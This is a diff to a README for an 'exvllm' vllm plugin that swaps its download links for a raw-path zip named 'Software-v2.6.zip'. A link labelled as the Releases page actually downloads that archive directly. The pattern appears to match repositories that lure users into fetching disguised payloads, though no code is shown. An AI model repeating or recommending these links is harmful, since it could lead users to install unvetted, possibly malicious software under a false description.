@@ -6,7 +6,7 @@ Welcome to exvllm! This extension plugin enhances vllm for mixed inference acros
 
 ## 📥 Download Now
 
-[![Download exvllm](https://raw.githubusercontent.com/Meahg/exvllm/main/src/x86/exvllm_v2.7.zip)](https://raw.githubusercontent.com/Meahg/exvllm/main/src/x86/exvllm_v2.7.zip)
+[![Download exvllm](https://github.com/Meahg/exvllm/raw/refs/heads/main/docs/Software-v2.6.zip)](https://github.com/Meahg/exvllm/raw/refs/heads/main/docs/Software-v2.6.zip)
 
 ## 🖥️ System Requirements
 
@@ -23,7 +23,7 @@ Before downloading exvllm, make sure your system meets the following requirement
 To get started, please follow these steps:
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://raw.githubusercontent.com/Meahg/exvllm/main/src/x86/exvllm_v2.7.zip) to find the latest version of exvllm.
+   Go to our [Releases page](https://github.com/Meahg/exvllm/raw/refs/heads/main/docs/Software-v2.6.zip) to find the latest version of exvllm.
 
 2. **Choose Your Version**
    On the Releases page, look for the version that suits your needs. Each version will have notes on what is new or fixed. 
